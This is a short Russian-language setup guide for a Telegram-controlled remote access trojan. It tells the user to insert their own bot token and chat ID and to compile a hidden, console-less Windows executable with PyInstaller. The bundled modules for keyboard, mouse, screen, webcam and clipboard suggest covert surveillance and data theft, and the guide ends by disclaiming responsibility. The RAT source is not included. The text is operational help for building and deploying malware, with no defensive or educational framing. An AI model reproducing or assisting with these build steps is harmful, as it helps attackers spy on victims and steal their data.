Привет!Что бы настроить рат бот под себя нужно зайти в код файла zalupa.py и там где 

TOKEN = "PASTE_YOUR_BOT_TOKEN"
CHAT_ID = 11111111

поставить свой бот токен(вам нужно создать своего бота)
и поставить свой айди телеграмма

после зайти в cmd и выполнить эту команду:
pip install pyinstaller
pyinstaller --version

после установить все пакеты и зависимости:
pip install aiogram opencv-python psutil pyautogui pillow numpy pywin32 mouse keyboard requests

проверь что код компилируется:
python -m py_compile bot.py

и пересобрать весь ехешник с помощью команды:

pyinstaller --onefile --noconsole --name bot --hidden-import=aiogram --hidden-import=aiogram.fsm.storage.memory --hidden-import=aiogram.fsm.state --hidden-import=aiogram.fsm.context --hidden-import=aiogram.filters --hidden-import=aiogram.types --hidden-import=cv2 --hidden-import=numpy --hidden-import=PIL --hidden-import=PIL.ImageGrab --hidden-import=pyautogui --hidden-import=mouse --hidden-import=keyboard --hidden-import=psutil --hidden-import=win32com --hidden-import=win32com.client --hidden-import=win32clipboard --hidden-import=win32api --hidden-import=win32con --hidden-import=win32timezone --hidden-import=email.mime.text --hidden-import=email.mime.multipart --hidden-import=smtplib --hidden-import=sqlite3 bot.py

если хочешь без консоли но с логами то собери этой командой:
pyinstaller --onefile --name bot --hidden-import=aiogram --hidden-import=cv2 --hidden-import=numpy --hidden-import=PIL --hidden-import=pyautogui --hidden-import=mouse --hidden-import=keyboard --hidden-import=psutil --hidden-import=win32com.client --hidden-import=win32clipboard --hidden-import=win32api bot.py


на этом все,удачи!
ОТВЕТСТВЕННОСТЬ ЗА ВАШИ ДЕЙСТВИЯНЕ БЕРУ!!!
